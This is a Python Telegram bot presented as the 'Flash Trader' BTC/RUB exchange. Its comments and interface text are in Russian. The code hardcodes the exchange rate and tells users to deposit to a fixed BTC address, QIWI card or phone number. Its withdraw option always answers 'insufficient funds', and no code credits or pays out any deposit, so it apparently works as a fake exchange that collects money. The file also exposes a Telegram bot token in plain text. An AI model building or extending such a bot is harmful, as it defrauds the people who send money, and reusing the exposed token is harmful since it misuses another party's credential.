# import parserBTC
# from parserBTC import course
from telegram import ParseMode
import telebot
from telebot import types

tradeText = "Укажите сумму в BTC или RUB:\n(пример: 0.0015 или 5000)\n\nМинимальная сумма BTC 0.0001, а максимальная 0.1\n\n⚠️Внимание: при обмене маленьких сумм (менее 0.0003 BTC) сделка может совершаться до 30 минут."

welcomeUrl = '[чат](https://t.me/joinchat/oMZb1BPHmxkwMjRl)'
welcomeText = "Вас приветствует обменник Flash Trader!\n\nЗдесь вы можете быстро обменять ваши BTC или RUB\n\nПо всем вопросам пишите: @FTSupport\n\nА так же вступайте в наш " + welcomeUrl + "!"
welcomeImg = '[.](https://imbt.ga/lm9zFWwnNk)'
# bot.send_message(chat_id, )

courseParse = "2 956 334,91"
courseText = "Средний рыночный курс на сегодня\n\n1 BTC = " + courseParse + " RUB"

# @flash_trader_bot
token = '1825221064:AAHUctmxAwtnWXU9bk8uJQ2NuHj6nYF3364'
bot = telebot.TeleBot(token)

@bot.message_handler(commands=["start"])
def inline(message):
    key = types.InlineKeyboardMarkup()
    # but_1 = types.InlineKeyboardButton(text="Отзывы 📣", callback_data="Callbacks", url='https://t.me/flash_trader_info')
    but_2 = types.InlineKeyboardButton(text="Курс BTC 📈", callback_data="Cource")
    but_3 = types.InlineKeyboardButton(text="Помощь ⚠️", callback_data="Help", url='https://t.me/FTSupport')
    but_4 = types.InlineKeyboardButton(text="Кошелёк 🔒", callback_data="Trade")
    key.add(but_2, but_3, but_4)
    # bot.send_photo(message.chat.id, open('logo.jpg', 'rb'));
    bot.send_message(message.chat.id, f'{welcomeText}\n{welcomeImg}', parse_mode='Markdown', reply_markup=key)


dataBtc = "`3Qp9h7M3syDFkJ9MMhY5CdqJBymQEGLPDh`"
dataQiwi = "`4890 4947 4379 3218`"
dataSim = "`79203799415`"
dataTxt1 = "Пополните данные реквизиты на необходимую вам сумму:\n\n"
dataTxt2 = "\n\nДанные для оплаты доступны 1 час ⏰"
@bot.callback_query_handler(func=lambda c:True)
def inlin(c):
    if c.data == 'Cource':
        # НЕ ЗАБЫТЬ ЗАМЕНИТЬ, ссукабля !!!
        bot.send_message(c.message.chat.id, courseText)
    if c.data == 'Help':
        bot.send_message(c.message.chat.id, '--- ВСТАВИТЬ ТЕКСТ ---')
    if c.data == 'Trade':
        bot.send_message(c.message.chat.id, "Укажите сумму в BTC или RUB:\n(пример: 0.0015 или 5000)\n\nВаш баланс 0.00000 BTC\n\nМинимальная сумма для снятия 0.0001 BTC")
    if c.data == 'btc':
        bot.send_message(c.message.chat.id, dataTxt1 + dataBtc + dataTxt2, parse_mode='Markdown')
    if c.data == 'qiwi':
        bot.send_message(c.message.chat.id, dataTxt1 + dataQiwi + dataTxt2, parse_mode='Markdown')
    if c.data == 'sim':
        bot.send_message(c.message.chat.id, dataTxt1 + dataSim + dataTxt2, parse_mode='Markdown')


# @bot.callback_query_handler(func=lambda cc:True)
# def inlin(cc):
#     if cc.data == 'Sell':
#         bot.send_message(cc.message.chat.id, 'биткоин продан')
#     if cc.data == 'Buy':
#         bot.send_message(cc.message.chat.id, 'биткоин куплен')

# старая версия
# @bot.message_handler(commands=['start'])
# def start_message(message):
#     keyboard = telebot.types.ReplyKeyboardMarkup(True)
#     keyboard.row('курс биткоина', 'обменять валюту')
#     bot.send_message(message.chat.id, 'это обменник, епт', reply_markup=keyboard)

# back up
# @bot.message_handler(content_types=['text'])
# def send_text(message):
#     if message.text.lower() == 'Вывести средства 💰':
#         bot.send_message(message.chat.id, 'На вашем кошельке недостаточно средств\n\nМинимальная сумма для снятия 0.0001 BTC')
#     elif message.text.lower() == 'Пополнить баланс 💸':
#         # keyboard = telebot.types.ReplyKeyboardMarkup(True)
#         # keyboard.row('биток', 'рубли')
#         bot.send_message(message.chat.id, 'хуй', reply_markup=keyboard)
#     else:
#         # bot.send_message(message.chat.id, 'функция недоступна или в разработке!')
#         keyboard = telebot.types.ReplyKeyboardMarkup(True)
#         keyboard.row('Вывести средства 💰', 'Пополнить баланс 💸')
#         bot.send_message(message.chat.id, "Выберите необходимую вам операцию" , reply_markup=keyboard)


@bot.message_handler(content_types=['text'])
def send_text(message):
    if message.text.lower() == 'вывести средства💰':
        bot.send_message(message.chat.id, 'На вашем кошельке недостаточно средств\n\nМинимальная сумма для снятия 0.0001 BTC')
    elif message.text.lower() == 'пополнить кошелёк💸':
        but_1 = types.InlineKeyboardButton(text="С BTC кошелька", callback_data="btc")
        but_2 = types.InlineKeyboardButton(text="QIWI", callback_data="qiwi")
        but_3 = types.InlineKeyboardButton(text="При помощи мобильного оператора", callback_data="sim")
        key = types.InlineKeyboardMarkup(row_width=2).add(but_1, but_2, but_3)
        # key_2 = types.InlineKeyboardMarkup(row_width=3).add(but_2)
        # key_3 = types.InlineKeyboardMarkup(row_width=3).add(but_3)
        # superkey = types.InlineKeyboardMarkup().add(key_1, key_2, key_3)
        bot.send_message(message.chat.id, f'Доступные на данный момент методы пополнения\n{welcomeImg}', parse_mode='Markdown', reply_markup=key)
    else:
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Вывести средства💰', 'Пополнить кошелёк💸')
        bot.send_message(message.chat.id, "Выберите нужную вам операцию", reply_markup=keyboard)




bot.polling()
# Запуск кода
# if __name__ == '__main__':
#     main()
